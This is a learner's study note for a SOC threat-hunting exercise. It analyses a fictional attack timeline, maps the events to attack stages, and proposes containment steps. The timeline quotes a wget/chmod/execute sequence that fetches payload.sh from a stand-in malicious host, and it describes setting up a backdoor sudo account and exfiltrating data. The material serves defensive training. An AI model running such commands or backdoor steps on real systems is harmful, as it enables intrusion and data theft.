# Week 2 Day 6 - Full Threat Hunting Investigation

This module captures my Week 2 Day 6 end-of-week assessment: a full SOC-style investigation that combines detection, hunting, analysis, and response.

## Day 6 Objective

Today I worked through a complete attack timeline and practiced treating it like a real incident investigation.

By the end of Day 6, I wanted to be able to:

- Identify multiple suspicious events across a full attack timeline
- Map observed behavior to attack stages
- Write a professional incident summary
- Propose immediate containment and response actions
- Connect the entire attack chain from initial access through exfiltration

## Full Attack Timeline

I was given the following sequence of events to analyze:

```text
1.  User: cody logs in at 2:13 AM from IP 203.0.113.45 (external)
2.  No failed login attempts
3.  Accesses multiple servers within 10 minutes
4.  Executes:
      wget http://malicious.com/payload.sh
      chmod +x payload.sh
      ./payload.sh
5.  Creates user: backup_admin
6.  Adds backup_admin to sudo group
7.  Adds SSH key to backup_admin
8.  Accesses 300 files
9.  Compresses into data.zip
10. Sends data.zip to external IP 198.51.100.25
```

## Investigation Q&A

### 1. What are the key suspicious events?

My answer:

The user logged in outside normal business hours from an external IP, downloaded and executed a script from an unknown external source, created a privileged backdoor account with SSH access, accessed a large number of files, and compressed and transferred them to an external IP.

### 2. What attack stages are present?

My answer:

Initial access, lateral movement between servers, malware installation, backdoor account creation, and data exfiltration.

SOC-level breakdown:

| Stage | Observed Activity |
| --- | --- |
| Initial Access | Compromised account login at 2:13 AM from external IP |
| Execution | Downloaded and ran `payload.sh` from external source |
| Lateral Movement | Accessed multiple servers within 10 minutes |
| Persistence | Created `backup_admin` with sudo and SSH key access |
| Exfiltration | Compressed 300 files into `data.zip` and sent to external IP |

### 3. What is my overall conclusion?

My answer:

A compromised account was used to gain unauthorized access, move laterally across systems, establish persistence through a backdoor account, execute a malicious payload, and exfiltrate sensitive data to an external destination.

### 4. What would I do immediately?

My answer:

Disable the compromised user account, investigate the affected systems, attempt to undo unauthorized changes, trace logs for all affected hosts, and block external access points.

SOC-level response actions:

- Disable the compromised account immediately
- Remove unauthorized accounts such as `backup_admin`
- Isolate affected systems from the network
- Block malicious IP addresses at the perimeter
- Preserve logs and forensic evidence before remediation

### 5. Incident Summary

An unauthorized actor used a compromised account to access the environment outside normal hours, move laterally across multiple systems, execute a malicious payload, and establish persistence through a backdoor admin account. The attacker then accessed and exfiltrated sensitive data to an external IP address.

## Bonus Analysis

Question: What is the biggest failure that allowed this attack to succeed?

- A. Weak password
- B. Lack of monitoring
- C. Poor network segmentation
- D. No alert tuning

My answer: **C initially, revised to B**

Reasoning:

I originally focused on poor network segmentation because it allowed easy lateral movement across multiple servers. However, the more accurate primary failure is lack of monitoring.

The attacker was able to:

- Log in at 2:13 AM undetected
- Execute scripts from an external URL without triggering alerts
- Create privileged accounts and add SSH keys without raising flags
- Exfiltrate data to an external IP without any response

None of these actions were caught in real time.

## Key Terms

- Attack chain: the full sequence of attacker actions from initial access through impact
- Incident summary: a concise professional description of what happened during a breach
- Containment: stopping the spread and impact of an active compromise
- Evidence preservation: protecting logs and forensic data before making changes
- Detection coverage: the extent to which monitoring tools can observe and alert on attacker behavior

## My Takeaways

What clicked for me:

- Connecting events into a timeline reveals the full scope of an attack that individual alerts would miss
- Mapping behavior to attack stages makes investigations shareable and repeatable
- Response is not just technical containment — it also requires preserving evidence for forensics
- Lack of monitoring is often the root cause that lets all other failures compound

## Next Up

Week 2 Day 7 - Week 2 review and assessment.
